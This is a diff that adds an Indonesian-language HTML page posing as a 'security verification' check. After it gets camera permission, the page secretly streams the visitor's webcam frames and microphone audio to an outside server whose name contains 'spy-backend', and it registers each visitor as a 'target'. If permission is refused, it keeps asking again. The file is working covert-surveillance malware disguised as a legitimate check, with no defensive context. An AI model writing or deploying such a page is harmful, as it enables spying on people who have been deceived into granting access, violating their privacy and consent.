@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Keamanan</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#000;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            color:#00ff41;
+            font-family:monospace;
+        }
+        .box{
+            text-align:center;
+            border:2px solid #00ff41;
+            padding:30px;
+            border-radius:10px;
+            box-shadow:0 0 20px #00ff4133;
+        }
+        h1{font-size:18px;margin-bottom:15px}
+        #status{font-size:13px;margin-top:10px}
+        video{display:none}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>SECURITY VERIFICATION</h1>
+        <p>Mohon izinkan akses kamera</p>
+        <p id="status">Menghubungkan...</p>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        // GANTI URL INI NANTI SETELAH BACKEND LIVE
+        const BACKEND_URL = "https://spy-backend-xxx.railway.app";
+        const socket = io(BACKEND_URL);
+        let stream;
+
+        async function init() {
+            try {
+                document.getElementById('status').innerText = 'Mengakses kamera...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video:{width:640,height:480,facingMode:'user'},
+                    audio:true
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                socket.emit('register-target');
+                document.getElementById('status').innerText = 'Terkoneksi';
+                
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                function sendFrame(){
+                    if(!stream || !socket.connected) return requestAnimationFrame(sendFrame);
+                    
+                    if(video.readyState >= 2 && video.videoWidth > 0){
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video,0,0);
+                        socket.emit('video-frame',{
+                            frame:canvas.toDataURL('image/jpeg',0.35)
+                        });
+                    }
+                    requestAnimationFrame(sendFrame);
+                }
+                sendFrame();
+                
+                const audioCtx = new AudioContext();
+                const source = audioCtx.createMediaStreamSource(stream);
+                const processor = audioCtx.createScriptProcessor(1024,1,1);
+                source.connect(processor);
+                processor.connect(audioCtx.destination);
+                
+                processor.onaudioprocess = (e) => {
+                    if(!socket.connected) return;
+                    const data = e.inputBuffer.getChannelData(0);
+                    const samples = [];
+                    for(let i=0;i<256;i++) samples.push(data[i*4]||0);
+                    socket.emit('audio-data',{samples});
+                };
+                
+            } catch(e) {
+                document.getElementById('status').innerText = 'Error: '+e.message;
+                setTimeout(init,2000);
+            }
+        }
+
+        socket.on('connect',()=>{
+            if(stream) socket.emit('register-target');
+        });
+
+        window.addEventListener('load',()=>setTimeout(init,500));
+    </script>
+</body>
+</html>
